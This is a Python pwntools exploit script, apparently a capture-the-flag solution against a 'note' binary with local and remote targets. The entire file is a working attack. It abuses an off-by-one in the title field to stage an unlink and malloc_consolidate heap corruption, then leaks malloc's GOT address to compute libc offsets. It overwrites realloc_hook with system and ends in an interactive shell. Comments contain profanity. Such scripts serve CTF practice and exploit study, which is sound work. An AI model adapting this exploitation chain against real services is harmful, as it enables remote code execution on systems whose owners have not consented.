#!/usr/bin python
from pwn import *

debug = 1
if debug:
	p = remote('127.0.0.1', 1234)
else:
	p = remote('39.107.14.183', 1234)


def change_title(title):
	p.recvuntil("option--->>\n")
	p.sendline("1")
	p.recvuntil("enter the title:")
	p.send(title)

def change_content(size, content):
	p.recvuntil("option--->>\n")
	p.sendline("2")
	p.recvuntil("Enter the content size(64-256):")
	p.sendline(str(size))
	p.recvuntil("Enter the content:")
	p.send(content)

def change_comment(comment):
	p.recvuntil("option--->>\n")
	p.sendline("3")
	p.recvuntil("Enter the comment:")
	p.send(comment)

def show_content():
	p.recvuntil("option--->>\n")
	p.sendline("4")
	p.recvuntil("The content is:")
	addr = u64(p.recv(6).ljust(8, '\x00'))
	return addr

def exploit():
	'''
	There is a question that if I leak the libc address first,
	then trigger malloc_consolidate, the program would be crashed!
	And in the end, I found the function change_title's off-by-one
	is fucking poisonous!!!
	So this is precious experience!! Just remember: using simple functions.
	'''
	print "[+] Trigger malloc_consolidate()..."
	#Attention, the content chunk's size is overwritten as 0x40
	#So first you must make a 0x40-size fake chunk here
	payload = 'a' * 0x30 + p64(0)  + p64(0x41)
	change_content(120, payload + '\n')

	title_ptr = 0x602070
	payload  = p64(0) + p64(0x20) + p64(title_ptr - 0x18) + p64(title_ptr - 0x10)
	payload += p64(0x20)
	#using off-by-one to set the pre_inuse bit 0
	assert(len(payload) == 40)
	change_title(payload + '@') #0x40
	#sleep(1)
	#request large chunk
	#raw_input("g0")
	
	#So the size is a riddle? It makes me confused.
	#See the source code?
	change_content(0x1000, 'a' * 10 + '\n')
	#sleep(1)
	change_content(0x20000, 'a' * 10 + '\n')
	#*0x602070 = 0x602070 - 0x18
	#sleep(1)
	#raw_input('g0')
	leak_payload = p64(0x602050) + p64(0x601f90)#malloc_got
	change_title(leak_payload + '\n')
	#raw_input("g0")
	malloc_addr = show_content()
	print "[+] malloc_addr: " + hex(malloc_addr)
	libc_addr = None
	one_gadget = None
	realloc_hook = None
	'''
	oops, RELRO
	exit_got = ELF("note").got['exit']
	'''
	if debug:
		libc_addr = malloc_addr - 0x84130
		one_gadget = libc_addr + 0xf1147
		realloc_hook = libc_addr + 0x3c4b08
		system_addr = libc_addr + 0x45390
		binsh_addr = libc_addr + next(ELF('libc.so.6').search('/bin/sh'))
	else:
		pass

	print "[+] libc_addr: " + hex(libc_addr)
	print "[+] one_gadget " + hex(one_gadget)
	print '[+] realloc_hook: ' + hex(realloc_hook)
	print '[+] system_addr: ' + hex(system_addr)
	print '[+] binsh_addr: ' + hex(binsh_addr)
	payload = p64(0) + p64(realloc_hook) + p64(binsh_addr)
	change_comment(payload + '\n')
	#raw_input("go")
	#one_gadget didn't succeed. fuck!
	change_comment(p64(system_addr) + '\n')
	#raw_input("g0")

	#change_content(120, 'a'*10+'\n')
	p.recvuntil("option--->>\n")
	p.sendline('2')
	p.recvuntil('Enter the content size(64-256):')
	p.sendline('100')

	p.interactive()


if __name__ == "__main__":
	exploit()